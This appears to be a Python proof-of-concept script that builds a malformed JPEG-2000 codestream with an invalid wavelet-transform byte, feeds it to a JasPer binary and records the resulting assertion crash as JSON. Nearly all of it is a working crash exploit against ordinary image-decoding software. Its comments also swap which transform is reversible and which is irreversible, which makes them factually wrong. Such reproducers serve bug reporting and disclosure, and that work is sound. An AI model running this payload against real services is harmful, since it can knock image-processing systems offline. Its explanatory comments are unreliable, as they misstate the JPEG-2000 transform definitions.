#!/usr/bin/env python3
"""PoC generator for a JasPer JPEG-2000 (raw .jpc) decoder assertion crash.

This script dynamically constructs a minimal but structurally valid JPEG-2000
codestream (raw codestream syntax, no JP2 box wrapper) whose COD marker carries
an invalid wavelet transformation byte (0x02 instead of the only accepted
values 0x00 = 9/7 reversible or 0x01 = 5/3 irreversible).

JasPer accepts the marker at header parse time, then fails an internal
consistency assertion while building the tile-component quantizer state:

    jasper: /jasper/src/libjasper/jpc/jpc_t1cod.c:144: JPC_NOMINALGAIN:
    Assertion `qmfbid == JPC_COX_RFT' failed.

which terminates the process with SIGABRT (returncode -6).  The payload is
built entirely in memory at run time and written to a temporary file; no
external samples or prebuilt payloads are required.
"""

import argparse
import json
import os
import signal as signal_module
import struct
import subprocess
import sys
import tempfile
import time

# ---------------------------------------------------------------- codestream


def _marker(tag, body=b""):
    """Encode a marker segment: 16-bit big-endian tag + 16-bit length + body.

    Per ISO/IEC 15444-1, the L field counts the bytes that follow it (the
    marker segment parameters), i.e. len(body) + 2.
    """
    return struct.pack(">H", tag) + struct.pack(">H", len(body) + 2) + body


def build_codestream():
    """Return a deterministic JPEG-2000 codestream that triggers the crash.

    The structure mirrors a real JasPer-encoded 64x64 grayscale image, except
    the COD marker's wavelet-transformation byte is set to an invalid value
    (0x02).  All other fields are kept self-consistent so the decoder proceeds
    past header parsing and into the tile decode path where the assertion
    fires.
    """
    width = height = 64

    out = bytearray()

    # SOC: start of codestream (no segment length field).
    out += struct.pack(">H", 0xFF4F)

    # SIZ: image and tile size (grayscale, 8-bit unsigned, 1x1 sampling).
    siz = struct.pack(">H", 0)                       # Rsiz (capabilities)
    siz += struct.pack(">IIII", width, height, 0, 0)  # Xsiz, Ysiz, XOsiz, YOsiz
    siz += struct.pack(">IIII", width, height, 0, 0)  # XTsiz, YTsiz, XTOsiz, YTOsiz
    siz += struct.pack(">H", 1)                      # Csiz (one component)
    siz += bytes([0x07, 0x01, 0x01])                 # Ssiz=8b unsigned, XRsiz=1, YRsiz=1
    out += _marker(0xFF51, siz)

    # COD: coding style.  The last byte is the wavelet transformation; 0x02 is
    # invalid (0x00 = 9/7 reversible, 0x01 = 5/3 irreversible) and trips the
    # JPC_NOMINALGAIN assertion during decode.
    cod = bytes([0x00])                              # Scod (no precincts/SOP/EPH)
    cod += bytes([0x00])                             # progression order (LRCP)
    cod += struct.pack(">H", 1)                      # number of layers
    cod += bytes([0x00])                             # multiple component transform
    cod += bytes([0x05, 0x04, 0x04, 0x00, 0x02])     # levels, cblk 2^4, cblk 2^4,
                                                     #   cblk style 0, transform 0x02
    out += _marker(0xFF52, cod)

    # QCD: scalar quantization, one guard bit, derived step sizes.
    qcd = bytes([0x40])
    qcd += bytes([0x40, 0x48, 0x48, 0x50, 0x48, 0x48, 0x50,
                  0x48, 0x48, 0x50, 0x48, 0x48, 0x50, 0x48, 0x48, 0x50])
    out += _marker(0xFF5C, qcd)

    # SOT: single tile, one tile-part (Psot covers SOT marker + tile data).
    tile_data = b"\x80" * 6
    sot = struct.pack(">H", 0)                          # Isot (tile 0)
    sot += struct.pack(">I", 20 + len(tile_data))       # Psot
    sot += bytes([0x00, 0x01])                          # TPsot=0, TNsot=1
    out += _marker(0xFF90, sot)

    # SOD: start of data, followed by a few nominal tile bytes.
    out += struct.pack(">H", 0xFF93)
    out += tile_data

    # EOC: end of codestream.
    out += struct.pack(">H", 0xFFD9)

    return bytes(out)


# ------------------------------------------------------------------- helpers

# Map common fatal signals (negative return codes) to their names.
_SIGNALS = {
    -getattr(signal_module, name): name
    for name in dir(signal_module)
    if name.startswith("SIG") and not name.startswith("SIG_")
}
# Both SIGABRT and SIGIOT share signal number 6 on Linux; report the
# conventional name for an abort()/assertion failure.
if -6 in _SIGNALS:
    _SIGNALS[-6] = "SIGABRT"


def _signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    return _SIGNALS.get(returncode, "SIGUNKNOWN")


def _truncate(text, limit=4000):
    if text is None:
        return ""
    if len(text) <= limit:
        return text
    return text[:limit] + "...[truncated]"


def _normalize_evidence(stderr):
    """Extract the most relevant crash evidence from captured stderr."""
    if not stderr:
        return ""
    lines = [ln.strip() for ln in stderr.splitlines() if ln.strip()]
    for ln in lines:
        if "Assertion" in ln or "assert" in ln.lower():
            return ln
    for ln in lines:
        if "jpc_t1cod.c" in ln or "failed" in ln.lower():
            return ln
    return lines[0]


# ------------------------------------------------------------------- driver


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Generate a JPEG-2000 codestream that crashes the target "
                    "JasPer transcoder via an assertion failure."
    )
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None,
                        help="write the JSON result to this path (else stdout)")
    parser.add_argument("--timeout", type=float, default=300.0,
                        help="per-run timeout in seconds (default 300)")
    args = parser.parse_args(argv)

    result = {
        "binary": args.binary,
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "stderr", "value": "", "path": None},
        "error": None,
    }

    # Build the trigger payload entirely in memory.
    payload = build_codestream()

    # Write it to a temporary file (auto-cleaned on close/exit).
    tmp = tempfile.NamedTemporaryFile(
        prefix="poc_jpc_", suffix=".jpc", delete=False
    )
    tmp_path = tmp.name
    try:
        tmp.write(payload)
        tmp.flush()
        os.fsync(tmp.fileno())
    finally:
        tmp.close()

    command = [
        args.binary,
        "-f", tmp_path,
        "-t", "jpc",
        "-F", "/dev/null",
        "-T", "pnm",
    ]
    result["command"] = command

    start = time.monotonic()
    try:
        proc = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=args.timeout,
        )
        elapsed = time.monotonic() - start
        result["runtime_ms"] = int(round(elapsed * 1000))
        result["returncode"] = proc.returncode
        result["signal"] = _signal_name(proc.returncode)
        result["timed_out"] = False
        result["stdout"] = _truncate(proc.stdout.decode("latin1", "replace"))
        result["stderr"] = _truncate(proc.stderr.decode("latin1", "replace"))
    except subprocess.TimeoutExpired as exc:
        elapsed = time.monotonic() - start
        result["runtime_ms"] = int(round(elapsed * 1000))
        result["timed_out"] = True
        result["returncode"] = None
        result["signal"] = None
        result["stdout"] = _truncate(
            (exc.stdout or b"").decode("latin1", "replace")
        )
        result["stderr"] = _truncate(
            (exc.stderr or b"").decode("latin1", "replace")
        )
    except FileNotFoundError as exc:
        result["error"] = "binary not found: %s" % (exc,)
    except Exception as exc:  # noqa: BLE001 - report any run failure faithfully
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass

    result["observable"]["value"] = _normalize_evidence(result["stderr"])

    out_text = json.dumps(result, indent=2, sort_keys=False)

    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(out_text + "\n")
    else:
        print(out_text)

    # Exit 0 when we successfully produced a result object (the crash itself
    # is reported inside the JSON, not via this script's exit status).
    return 0


if __name__ == "__main__":
    sys.exit(main())
